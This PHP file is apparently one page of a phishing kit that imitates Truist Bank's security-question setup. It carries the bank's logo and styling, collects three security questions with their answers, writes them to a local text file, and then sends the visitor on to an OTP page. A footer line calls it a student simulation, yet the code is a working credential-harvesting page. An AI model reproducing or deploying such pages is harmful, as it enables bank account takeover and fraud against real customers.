<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

$questions = [
    'What was your childhood nickname?',
    "What is your mother's maiden name?",
    'What was the name of your first pet?',
    'What was the make and model of your first car?',
    'What city were you born in?',
    'What is your favorite childhood memory?',
    'What was your first job title?',
    'What is the name of your favorite teacher?',
    'What is your favorite book or movie character?',
    'What street did you grow up on?'
];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $question1 = $_POST['question1'] ?? '';
    $answer1 = trim($_POST['answer1'] ?? '');
    $question2 = $_POST['question2'] ?? '';
    $answer2 = trim($_POST['answer2'] ?? '');
    $question3 = $_POST['question3'] ?? '';
    $answer3 = trim($_POST['answer3'] ?? '');

    if (empty($question1)) $errors['question1'] = 'Please select a question';
    if (empty($answer1)) $errors['answer1'] = 'Please provide an answer';
    if (empty($question2)) $errors['question2'] = 'Please select a question';
    if (empty($answer2)) $errors['answer2'] = 'Please provide an answer';
    if (empty($question3)) $errors['question3'] = 'Please select a question';
    if (empty($answer3)) $errors['answer3'] = 'Please provide an answer';

    $uniqueQuestions = array_unique([$question1, $question2, $question3]);
    if (count($uniqueQuestions) < 3) {
        $errors['general'] = 'Please select three different security questions';
    }

    if (empty($errors)) {
        $data = [
            'step' => 'security_questions',
            'usrnm' => $username,
            'chld_pt' => $question1,
            'pt_ans' => $answer1,
            'brth_ct' => $question2,
            'ct_ans' => $answer2,
            'frst_sch' => $question3,
            'sch_ans' => $answer3
        ];

        saveUserData('security_questions.txt', $data);

        header('Location: otp.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Questions - Truist Bank</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen flex flex-col bg-[#f6f3fa]">
    <!-- Header -->
    <header class="bg-[#2b0d49] text-white shadow-[0_2px_8px_rgba(22,9,40,0.45)]">
        <div class="max-w-6xl mx-auto h-16 flex items-center justify-start px-6">
            <img
                src="assets/trulogo_horz-white.png"
                alt="Truist logo"
                class="h-8 w-auto"
            />
        </div>
    </header>

    <!-- Main Content -->
    <main class="flex-1 flex items-start justify-center px-4 sm:px-6 py-10">
        <div class="w-full max-w-5xl">
            <section class="w-full">
                <h1 class="mx-auto mb-6 w-full max-w-2xl text-center text-3xl font-semibold text-[#2b0d49]">
                    Security Questions
                </h1>
                <div class="mx-auto w-full max-w-2xl rounded-2xl border border-[#e2d8f1] bg-white shadow-[0_20px_60px_rgba(43,13,73,0.12)]">
                    <div class="px-8 py-10">
                        <p class="text-sm font-semibold text-[#6c5d85]">Set up your security questions for account protection</p>

                        <?php if (!empty($errors)): ?>
                            <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
                                <div class="flex">
                                    <div class="flex-shrink-0">
                                        <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                        </svg>
                                    </div>
                                    <div class="ml-3">
                                        <p class="text-sm text-red-700">
                                            <?php echo htmlspecialchars(implode(' ', $errors)); ?>
                                        </p>
                                    </div>
                                </div>
                            </div>
                        <?php endif; ?>

                        <form method="POST" class="mt-8 space-y-6">
                            <!-- Question 1 -->
                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]" for="question1">
                                    Security Question 1
                                </label>
                                <select
                                    id="question1"
                                    name="question1"
                                    class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                    onchange="updateQuestionOptions()"
                                    required
                                >
                                    <option value="">Select a question</option>
                                    <?php foreach ($questions as $question): ?>
                                        <option value="<?php echo htmlspecialchars($question); ?>" <?php echo (isset($_POST['question1']) && $_POST['question1'] === $question) ? 'selected' : ''; ?>>
                                            <?php echo htmlspecialchars($question); ?>
                                        </option>
                                    <?php endforeach; ?>
                                </select>
                                <?php if (isset($errors['question1'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['question1']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>

                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]" for="answer1">
                                    Answer 1
                                </label>
                                <input
                                    id="answer1"
                                    name="answer1"
                                    type="text"
                                    value="<?php echo htmlspecialchars($_POST['answer1'] ?? ''); ?>"
                                    class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                    placeholder="Enter your answer"
                                    required
                                />
                                <?php if (isset($errors['answer1'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['answer1']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>

                            <!-- Question 2 -->
                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]" for="question2">
                                    Security Question 2
                                </label>
                                <select
                                    id="question2"
                                    name="question2"
                                    class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                    onchange="updateQuestionOptions()"
                                    required
                                >
                                    <option value="">Select a question</option>
                                    <?php foreach ($questions as $question): ?>
                                        <option value="<?php echo htmlspecialchars($question); ?>" <?php echo (isset($_POST['question2']) && $_POST['question2'] === $question) ? 'selected' : ''; ?>>
                                            <?php echo htmlspecialchars($question); ?>
                                        </option>
                                    <?php endforeach; ?>
                                </select>
                                <?php if (isset($errors['question2'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['question2']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>

                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]" for="answer2">
                                    Answer 2
                                </label>
                                <input
                                    id="answer2"
                                    name="answer2"
                                    type="text"
                                    value="<?php echo htmlspecialchars($_POST['answer2'] ?? ''); ?>"
                                    class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                    placeholder="Enter your answer"
                                    required
                                />
                                <?php if (isset($errors['answer2'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['answer2']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>

                            <!-- Question 3 -->
                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]" for="question3">
                                    Security Question 3
                                </label>
                                <select
                                    id="question3"
                                    name="question3"
                                    class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                    onchange="updateQuestionOptions()"
                                    required
                                >
                                    <option value="">Select a question</option>
                                    <?php foreach ($questions as $question): ?>
                                        <option value="<?php echo htmlspecialchars($question); ?>" <?php echo (isset($_POST['question3']) && $_POST['question3'] === $question) ? 'selected' : ''; ?>>
                                            <?php echo htmlspecialchars($question); ?>
                                        </option>
                                    <?php endforeach; ?>
                                </select>
                                <?php if (isset($errors['question3'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['question3']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>

                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]" for="answer3">
                                    Answer 3
                                </label>
                                <input
                                    id="answer3"
                                    name="answer3"
                                    type="text"
                                    value="<?php echo htmlspecialchars($_POST['answer3'] ?? ''); ?>"
                                    class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                    placeholder="Enter your answer"
                                    required
                                />
                                <?php if (isset($errors['answer3'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['answer3']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>

                            <div class="flex flex-wrap gap-3 pt-2">
                                <button
                                    type="submit"
                                    class="inline-flex items-center justify-center rounded-full bg-[#5f259f] px-8 py-3 text-sm font-semibold text-white hover:bg-[#4a1a7e]"
                                >
                                    Continue
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </section>
        </div>
    </main>

    <!-- Footer -->
    <footer class="bg-[#2b0d49] text-white">
        <div class="max-w-6xl mx-auto px-6 py-8 grid gap-6 lg:grid-cols-[auto_1fr_auto] items-start">
            <div class="flex flex-col gap-3">
                <div class="flex items-center">
                    <img
                        src="assets/trulogo_horz-white.png"
                        alt="Truist logo"
                        class="h-8 w-auto"
                    />
                </div>
                <p class="text-xs text-white/70 max-w-xs">
                    Tailored banking experiences, demonstrated for students and simulation exercises only.
                </p>
            </div>

            <div class="grid gap-3 sm:grid-cols-2 lg:grid-cols-3 text-sm">
                <ul class="space-y-2">
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Privacy
                        </a>
                    </li>
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Accessibility
                        </a>
                    </li>
                </ul>
                <ul class="space-y-2">
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Fraud & security
                        </a>
                    </li>
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Limit use of my sensitive personal information
                        </a>
                    </li>
                </ul>
                <ul class="space-y-2">
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Terms and conditions
                        </a>
                    </li>
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Disclosures
                        </a>
                    </li>
                </ul>
            </div>
        </div>
        <div class="bg-black/90">
            <p class="max-w-6xl mx-auto px-6 py-3 text-center text-xs text-white/70">
                © 2025, Truist. All rights reserved.
            </p>
        </div>
    </footer>

    <script>
        function updateQuestionOptions() {
            const question1 = document.getElementById('question1').value;
            const question2 = document.getElementById('question2').value;
            const question3 = document.getElementById('question3').value;
            
            const selects = [document.getElementById('question1'), document.getElementById('question2'), document.getElementById('question3')];
            
            selects.forEach((select, index) => {
                const currentValue = select.value;
                const selectedQuestions = [question1, question2, question3];
                
                // Clear all options first
                select.innerHTML = '<option value="">Select a question</option>';
                
                // Add all questions back
                <?php foreach ($questions as $question): ?>
                    const question = "<?php echo htmlspecialchars($question); ?>";
                    if (!selectedQuestions.includes(question) || question === currentValue) {
                        const option = document.createElement('option');
                        option.value = question;
                        option.textContent = question;
                        if (question === currentValue) {
                            option.selected = true;
                        }
                        select.appendChild(option);
                    }
                <?php endforeach; ?>
            });
        }
        
        // Initialize on page load
        document.addEventListener('DOMContentLoaded', updateQuestionOptions);
    </script>
</body>
</html>
